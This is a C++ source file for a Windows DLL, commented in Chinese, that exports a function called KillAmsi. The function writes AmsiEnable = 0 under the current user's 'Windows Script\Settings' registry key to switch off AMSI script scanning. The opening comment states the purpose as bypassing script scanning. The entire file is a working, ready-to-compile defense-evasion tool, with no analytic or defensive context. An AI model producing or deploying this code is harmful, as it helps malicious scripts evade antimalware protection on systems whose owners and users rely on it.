// 通过注册表禁用 AMSI 以绕过脚本扫描

#include<windows.h>
#include<bits/stdc++.h>
#define EXPORT __declspec(dllexport)

extern "C"{
    // 返回值: 0 = 成功, 1 = 注册表打开失败
    EXPORT int KillAmsi(){
        // 目标注册表路径: HKCU\Software\Microsoft\Windows Script\Settings
        // 将 AmsiEnable 设为 0 可禁用 AMSI 脚本扫描
        HKEY hkey = NULL;
        DWORD dwDisposition;   // 接收操作结果: REG_CREATED_NEW_KEY 或 REG_OPENED_EXISTING_KEY
        LONG lResult;          // 接收 API 调用返回值 (ERROR_SUCCESS 表示成功)

        // 打开或创建目标注册表键
        lResult = RegCreateKeyEx(
            HKEY_CURRENT_USER,                            // 根键: 当前用户
            TEXT("Software\\Microsoft\\Windows Script\\Settings"), // 子键路径
            0,                                             // 保留，必须为 0
            NULL,                                          // 未使用
            REG_OPTION_NON_VOLATILE,                       // 键值持久保存到注册表文件
            KEY_SET_VALUE,                                 // 请求写入权限
            NULL,                                          // 使用默认安全属性
            &hkey,                                         // 输出: 打开的键句柄
            &dwDisposition                                 // 输出: 创建或打开
        );

        // 检查 RegCreateKeyEx 是否成功
        if (lResult != ERROR_SUCCESS) {
            return 1;  // 注册表操作失败（通常需要管理员权限）
        }

        DWORD dwValue = 0; // 0 = 禁用, 1 = 启用
        // 设置 AmsiEnable 的值为 0
        lResult = RegSetValueEx(
            hkey,                                          // 目标键句柄
            TEXT("AmsiEnable"),                             // 要设置的值的名称
            0,                                              // 保留，必须为 0
            REG_DWORD,                                      // 值类型: 32 位整数
            (const BYTE*)&dwValue,                          // 数据缓冲区
            sizeof(dwValue)                                 // 数据大小 (字节)
        );

        // 关闭注册表键句柄，释放资源
        RegCloseKey(hkey);
        return 0;  // 成功
    }
}